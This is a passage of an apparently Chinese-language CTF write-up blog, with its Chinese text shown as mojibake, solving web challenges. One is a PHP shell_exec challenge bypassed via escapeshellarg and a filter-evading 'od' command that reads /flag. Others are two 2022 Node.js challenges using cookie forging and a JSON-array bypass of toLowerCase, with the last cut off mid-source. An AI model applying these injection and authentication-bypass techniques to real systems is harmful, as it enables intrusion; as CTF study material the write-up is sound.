class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DefenderBonus</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Pokemon</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ghostpokemon</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$Pokemon</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$pks</span>) &#123;</span><br><span class="line">            <span class="variable">$Pokemon</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$pks</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Pokemon</span> = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$Pokemon</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;myfavorite&#x27;</span>] ?? <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;picacu!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;picacu!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;bulbasaur!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;miaowa!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$level</span> = <span class="variable">$_POST</span>[<span class="string">&quot;levelup&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="variable">$level</span>)) &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$level</span>))))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./hint.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;squirtle&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;jienijieni!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;mewtwo&#x27;</span>:</span><br><span class="line">        <span class="variable">$dream</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dream&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$dream</span>)&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;So Big Pokenmon!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ghostpokemon</span>(<span class="variable">$dream</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$dream</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯å…³äºescapeshellargçš„è€ƒç‚¹ã€‚</p>
<pre><code>escapeshellarg çš„ä½œç”¨æ˜¯æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ã€‚ï¼ˆescapeshellarg å’Œ escapeshellcmd ç›¸ä¼¼ï¼Œä¸»è¦çœ‹æ˜¯å¦æœ‰å¼•å·ï¼‰

é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨æ¼æ´ï¼šescapeshellarg()è¿™ä¸ªå‡½æ•°åœ¨å¤„ç†è¶…è¿‡ASCIIç èŒƒå›´çš„å­—ç¬¦çš„æ—¶å€™ä¼šç›´æ¥è¿‡æ»¤æ‰è¯¥å­—ç¬¦ä¸²
</code></pre>
<p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æˆ‘ä»¬å¯ä»¥ç”¨%81å»ç»•è¿‡ï¼Œå› ä¸º%81ä¸ºä¸å¯è§å­—ç¬¦ï¼ˆå½“ç„¶è¿˜æœ‰å…¶ä»–çš„ï¼‰<br><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png" alt="image-20241207183625856"></p>
<p>è¯»å–åˆ°äº†hint.php</p>
<p>ç„¶åå°±æ˜¯å¯¹&#x2F;flagå†…å®¹çš„è¯»å–äº†ï¼</p>
<p>ä½†æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ä¸€å †ï¼Œå…ˆçœ‹ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png" alt="img"></p>
<p>ç„¶åæ˜¯è¯»å–çš„å‘½ä»¤ï¼Œè¿‡æ»¤äº†å¤ªå¤šå•¦ï¼ï¼odå¯ä»¥ç”¨ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od%09/F[B-O][@-B]G</span><br></pre></td></tr></table></figure>

<p>ä¸­æ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤å’Œ-æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png" alt="image-20241207191631376"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dump = <span class="string">&quot;0000000 051516 041523 043124 031573 034465 032544 062463 026467 0000020 032064 030543 032055 034460 026465 033071 031063 031455 0000040 063144 060467 031146 032545 063145 076471 000012 0000055&quot;</span></span><br><span class="line">octs = [(<span class="string">&quot;0o&quot;</span> + n) <span class="keyword">for</span> n <span class="keyword">in</span> dump.split(<span class="string">&quot; &quot;</span>) <span class="keyword">if</span> n]</span><br><span class="line">hexs = [<span class="built_in">int</span>(n, <span class="number">8</span>) <span class="keyword">for</span> n <span class="keyword">in</span> octs]</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> hexs:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(<span class="built_in">hex</span>(n)) &gt; <span class="number">4</span>):</span><br><span class="line">        swapped = <span class="built_in">hex</span>(((n &lt;&lt; <span class="number">8</span>) | (n &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">        result += swapped[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(result).decode())</span><br></pre></td></tr></table></figure>

<p>odè·å¾—çš„ç»“æœæ˜¯å…«è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿™é‡Œç»™å‡ºè§£ç è„šæœ¬</p>
<p>NSSCTF{359d53e7-44c1-4095-9632-3df7af2e5ef9}</p>
<h2 id="è¥¿æ¹–è®ºå‰‘-2022-Node-Magical-Login"><a href="#è¥¿æ¹–è®ºå‰‘-2022-Node-Magical-Login" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login"></a>[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login</h2><p>ç»™äº†æºç ï¼Œè¿™é“é¢˜ä¸»è¦çœ‹æºç å°±è¡Œ</p>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&quot;./controller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">LoginController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>,<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname,<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>,<span class="variable constant_">HOST</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is listening on Host <span class="subst">$&#123;HOST&#125;</span> Port <span class="subst">$&#123;PORT&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>controller.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•ï¼Œå…ˆçœ‹flag1ï¼ŒåŠ ä¸€ä¸ªcookieå°±è¡Œ</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png" alt="image-20241211091858315" style="zoom:80%;" />

<p>é‡ç‚¹æ˜¯flag2ï¼Œéœ€è¦ç»•è¿‡toLowerCase()ï¼Œä¼ å…¥ä¸€ä¸ªjsonå€¼ï¼Œè¦æ±‚è½¬å°å†™åä¸ºaGr5AtSp55dRacerï¼Œå¯ä»¥é€šè¿‡jsonå½¢å¼ä¼ å…¥æ•°ç»„æ¥ç»•è¿‡ï¼Œè€è€å®å®ä¼ å…¥å­—ç¬¦ä¸²æ˜¯ä¸å¯èƒ½çš„ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png" alt="image-20241211092027384"></p>
<p>ç®€å•ã€‚</p>
<h2 id="è¥¿æ¹–è®ºå‰‘-2022-real-ez-node"><a href="#è¥¿æ¹–è®ºå‰‘-2022-real-ez-node" class="headerlink" title="[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node"></a>[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</h2><p>å…³é”®æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span 